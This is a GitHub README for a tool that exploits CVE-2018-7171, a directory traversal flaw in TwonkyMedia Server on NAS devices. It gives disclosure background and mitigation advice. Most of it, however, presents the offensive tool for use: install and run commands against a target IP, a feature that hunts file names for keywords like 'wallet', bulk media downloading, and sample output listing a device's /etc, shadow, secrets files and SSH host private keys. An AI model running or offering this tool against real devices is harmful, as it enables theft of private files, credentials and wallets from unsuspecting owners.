# sharingIsCaring
## Background information
This is a GitHub repository keeping all relevant information about CVE-2018-7171.

CVE-2018-7171 represents a directory/file traversal vulnerability in TwonkyMedia Server 
version 7.0.11-8.5. Exploiting this vulnerability allows an attacker to list all files
located on the device, that is running the TwonkyMedia Server. Furthermore, an attacker is
able to download all media files (pictures, videos, and music) from a device after exploiting
this vulnerability. To exploit this vulnerability TwonkyMedia Server must not be protected 
by a password (which is the default setup).

Since a huge amount, around 24'000 TwonkyMedia Server instances, are reachable via the internet
the researcher decided to publish this vulnerability.

Maybe you don't know that TwonkyMedia Server is running on your device nor you know that it's
exposed in the internet. This is due to the fact that TwonkyMedia Server is pre-installed on
many NAS devices. If your router configuration automatically forwards the port (e.g. 9000) 
because it's a DLNA share, you're probably owned.

If your devices are affected by this vulnerability, expect all files on your device as no longer 
private.

Please make sure to switch off or protect your TwonkyMedia Server with a password, because no
fix for this vulnerability is available. 

## About

<b>twonky.py</b> can be used to comfortably browse devices running TwonkyMedia Server. 
Also, a feature is implemented which checks file and directory names against a built-in 
extensible wordlist for keywords e.g. "wallet". Furthermore, interesting system information
is requested and presented to the user.

<b>downloadFiles.py</b> can be used to perform bulk downloads of TwonkyMedia Server indexed directories.

## Installation
```
$ git clone https://github.com/mechanico/sharingIsCaring.git

$ cd sharingIsCaring

$ sudo pip install -r requirements.txt
```
You're ready to go!

## Usage 

```
$ twonky.py [IP Adress] [port]
https://www.shodan.io/host/[IP Adress]
*** Port [port] opened ***
Run Twonky browser on port [port] [Y, N]? [Y] y
*** Get Serverdetails from Twonky ***
Server Name: TwonkyMedia [piranhacloud]
Serverplatform: qnap_marvell_6281::qnap-ts219-oem
Pictures shared: 34743
Videos shared: 1804
Pictures shared: 235592
Videos shared: 7348
Twonky Version: 8.2.1
Build date: 02/08/2016 (mm/dd/yyyy)
*** 'contentbase' path set to '/'' ***
path nr: [enter directory number] [delimiter "/"]
------------------------------
```

## Explanation of output
* The "path nr" is e.g. 001, 002, ...
* To browse through directories use "/" as delimiter, e.g. 005/091

* Directories are marked with "Dir"
* Directories are colored "GREEN"

* Files are marked with "Fil"
* Files are not colored

* If a Keyword is discovered the line will be colored "RED"

## Example usage
```
$ python twonky.py xxx.xxx.xxx.xxx 9000
https://www.shodan.io/host/xxx.xxx.xxx.xxx
*** Port 9000 opened ***
Run Twonky browser on port 9000 [Y, N]? [Y] y
*** Get Serverdetails from Twonky ***
Server Name: TwonkyMedia [piranhacloud]
Serverplatform: qnap_marvell_6281::qnap-ts219-oem
Pictures shared: 34743
Videos shared: 1804
Pictures shared: 235592
Videos shared: 7348
Twonky Version: 8.2.1
Build date: 02/08/2016 (mm/dd/yyyy)
*** 'contentbase' path set to '/'' ***
path nr:
------------------------------
001 Dir /
002 Dir /bin
003 Fil /DEBUG
004 Dir /dev
005 Dir /etc
006 Dir /home
007 Dir /IPSEC
008 Dir /lib
009 Fil /linuxrc
010 Dir /mnt
011 Dir /opt
012 Fil /php.ini
013 Dir /proc
014 Dir /root
015 Dir /rpc
016 Dir /sbin
017 Dir /share
018 Dir /sys
019 Dir /tmp
020 Dir /usr
021 Dir /var
------------------------------
path nr: 005
------------------------------
001 Fil .qsys.log
002 Dir acpi
003 Fil apache-sys-proxy-ssl.conf
004 Fil apache-sys-proxy.conf
005 Dir apcupsd
006 Fil app_proxy.conf
007 Dir avahi
008 Fil bandwidth_record.conf
009 Fil blkid.tab
010 Fil blkid.tab.old
011 Dir bluetooth
012 Fil burntest.sym
013 Dir config
014 Fil daemon_mgr.conf
015 Dir dbus-1
016 Fil default-tz-list.json
017 Dir default_config
018 Dir dhcpc
019 Fil filemanager.conf
020 Fil filesystems
021 Fil fstab
022 Fil group
023 Fil gssapi_mech.conf
024 Fil hostname
025 Fil hosts
026 Dir hotplug
027 Dir hotplug.d
028 Fil idmapd.conf
029 Dir init.d
030 Fil inittab
031 Fil inittab.disable
032 Fil inittab.enable
033 Fil inittab.enable.tolapai
034 Fil inputrc
035 Fil ipsec.conf
036 Dir ipsec.d
037 Fil ipsec.secrets
038 Dir iscsi
039 Fil issue
040 Fil krb5.keytab
041 Fil krb5_tmpl.conf
042 Fil ld.so.cache
043 Fil ld.so.conf
044 Dir linuxigd
045 Fil localtime
046 Fil login.defs
047 Dir logs
048 Dir lunporter
049 Fil mdadm.conf
050 Fil model.conf
051 Fil mt-daapd.conf
052 Fil mtab
053 Fil my.cnf
054 Fil netconfig
055 Dir network
056 Fil nsswitch.conf
057 Fil ntp.conf
058 Dir openldap
059 Fil opentftpd.ini
060 Dir openvpn
061 Dir pam.d
062 Fil passwd
063 Fil php-fpm-sys-proxy.conf
064 Fil platform.conf
065 Dir ppp
066 Fil printcap
067 Fil profile
068 Fil protocols
069 Fil qbox-mariadb.cnf
070 Dir qmonitor
071 Fil qos.ui.cp.conf
072 Fil qos.ui.sm.conf
073 Fil qpkg_run_status
074 Dir qsync
075 Dir raddb
076 Fil raidtab
077 Fil random-seed
078 Dir rcK.d
079 Dir rcK_init.d
080 Dir rcS.d
081 Dir rcS_init.d
082 Fil resolv.conf
083 Fil rsyncd.conf
084 Fil samba4_flag
085 Fil securetty
086 Fil service.home.lst
087 Fil service.smb.lst
088 Fil services
089 Fil shadow
090 Fil smb.conf
091 Dir ssh
092 Dir ssl
093 Fil storage.conf
094 Fil strongswan.conf
095 Dir strongswan.d
096 Dir stunnel
097 Dir swanctl
098 Fil thttpd.conf
099 Fil TZ
100 Fil tzlist
101 Dir udev
102 Fil updatedb.conf
103 Fil upnpd.conf
104 Dir xl2tpd
105 Fil yp.conf
106 Dir zoneinfo
107 Dir zoneinfo.src
------------------------------
path nr: 005/091
------------------------------
001 Fil ssh_host_dsa_key
002 Fil ssh_host_dsa_key.pub
003 Fil ssh_host_rsa_key
004 Fil ssh_host_rsa_key.pub
005 Fil sshd_config
------------------------------
path nr:
```
